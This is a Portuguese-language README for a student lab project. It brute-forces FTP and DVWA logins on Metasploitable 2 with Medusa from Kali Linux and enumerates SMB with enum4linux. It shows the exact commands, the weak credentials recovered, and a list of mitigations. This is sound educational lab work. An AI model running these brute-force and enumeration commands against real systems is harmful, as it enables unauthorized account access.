# 🚨 Laboratório de Ataques de Força Bruta — Kali Linux + Medusa

## 📌 Visão Geral

Este projeto demonstra a execução de ataques de força bruta em um ambiente controlado utilizando **Kali Linux** e a ferramenta **Medusa**, tendo como alvo a máquina vulnerável **Metasploitable 2** e a aplicação web **DVWA (Damn Vulnerable Web Application)**.

O objetivo é compreender como mecanismos de autenticação fracos podem ser explorados e quais medidas podem ser adotadas para mitigar essas vulnerabilidades.

---

## 🧪 Ambiente do Laboratório

| Componente    | Descrição                    |
| ------------- | ---------------------------- |
| Atacante      | Kali Linux                   |
| Alvo          | Metasploitable 2             |
| Aplicação Web | DVWA                         |
| Rede          | VirtualBox (Host-Only + NAT) |

### 📍 Endereçamento IP

```id="p5m5ld"
Kali Linux: 192.168.55.X
Metasploitable 2: 192.168.55.3
```

---

## 📂 Estrutura do Projeto

```id="mk6fub"
brute-force-lab-kali-medusa/
│
├── README.md
├── comandos/
│   ├── ftp.txt
│   ├── http.txt
│   └── smb_enum.txt
│
├── wordlists/
│   ├── users.txt
│   └── pass.txt
│
├── resultados/
│   ├── ftp_result.txt
│   ├── http_result.txt
│   └── enum4_output.txt
│
└── images/
```

---

## 🔐 Cenários de Ataque

### 1️⃣ Ataque de Força Bruta em FTP

Utilizando o Medusa para testar combinações de usuários e senhas no serviço FTP.

```bash id="n3nm5n"
medusa -h 192.168.55.3 -U wordlists/users.txt -P wordlists/pass.txt -M ftp -t 6
```

### ✅ Resultado

```id="dp1otn"
Usuário: msfadmin
Senha: msfadmin
```

### 🔎 Validação de Acesso

```bash id="m7nf1t"
ftp 192.168.55.3
```

✔️ Login realizado com sucesso

---

### 2️⃣ Ataque de Força Bruta em Aplicação Web (DVWA)

Execução de ataque contra o sistema de autenticação web.

```bash id="4ptq4v"
medusa -h 192.168.55.3 -U wordlists/users.txt -P wordlists/pass.txt -M http -t 6
```

### ✅ Resultados

```id="1ne6n7"
admin : password
root  : 123456
user  : qwerty
```

---

### 3️⃣ Enumeração SMB

Coleta de informações sobre usuários, compartilhamentos e políticas de segurança.

```bash id="af02ir"
enum4linux -a 192.168.55.3 | tee resultados/enum4_output.txt
```

---

## 🔍 Principais Descobertas

* Uso de senhas fracas e previsíveis
* Ausência de política de bloqueio por tentativas
* Acesso anônimo permitido no SMB
* Complexidade de senha desativada
* Múltiplas credenciais válidas em diferentes serviços

---

## ⚠️ Vulnerabilidades Identificadas

* Suscetibilidade a ataques de força bruta
* Políticas de senha inadequadas
* Enumeração excessiva de usuários
* Compartilhamentos SMB mal configurados
* Falta de proteção nos mecanismos de autenticação

---

## 🛡️ Medidas de Mitigação

* Implementar políticas de senha forte
* Configurar bloqueio de conta após tentativas inválidas
* Utilizar autenticação multifator (MFA)
* Desativar acessos anônimos
* Aplicar limitação de tentativas (rate limiting)
* Monitorar logs de autenticação

---

## 📚 Aprendizados

Este projeto proporcionou:

* Entendimento prático de ataques de força bruta
* Exploração de credenciais fracas
* Técnicas de enumeração de serviços
* Identificação de falhas de configuração
* Aplicação de boas práticas de segurança

---

## ⚖️ Aviso Legal

Este projeto foi desenvolvido exclusivamente para fins educacionais em ambiente controlado.
Não utilize essas técnicas em sistemas sem autorização.

---

## 🚀 Autor

Desenvolvido por **Teus**
Futuro Analista de Cibersegurança 🔐
